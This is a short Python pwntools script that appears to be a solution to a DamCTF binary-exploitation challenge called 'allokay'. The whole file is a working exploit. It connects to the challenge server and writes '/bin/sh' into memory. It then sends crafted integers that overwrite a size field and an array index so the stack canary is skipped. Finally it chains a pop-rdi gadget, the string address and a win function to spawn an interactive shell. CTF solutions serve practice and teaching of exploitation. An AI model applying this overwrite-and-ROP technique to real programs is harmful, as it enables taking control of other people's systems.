#!/usr/bin/python 
from pwn import *

s = remote("chals.damctf.xyz", 32575)
#s = process("./allokay")
s.recvuntil("How many favorite numbers do you have?")

win = 0x400767
pop_rdi_ret = 0x0000000000400933
bin_sh = 0x6010a8

s.sendline("14" + "a"*6 + "/bin/sh\x00")

#s.sendlineafter("Please enter the numbers!", "1")
s.recvuntil("Please enter the numbers!")

for i in range(5):
    s.sendline("1")

s.sendline(str(0x0ecafebabe))		# because the variable is casted into int, it is in the upper half of our integer => overwrite size with 0xe=14 so that it fits our payload size (14 integers). More than 14 will requires us to input more numbers 
s.sendline("6")				
s.sendline(str(0xa00000007))		# same thing as above, overwrite the index pointer with 0xa so that we don't end up overwriting the canary => make it the index of rip which is 0xa.

s.sendline(str(pop_rdi_ret))
s.sendline(str(bin_sh))
s.sendline(str(win))
s.interactive()

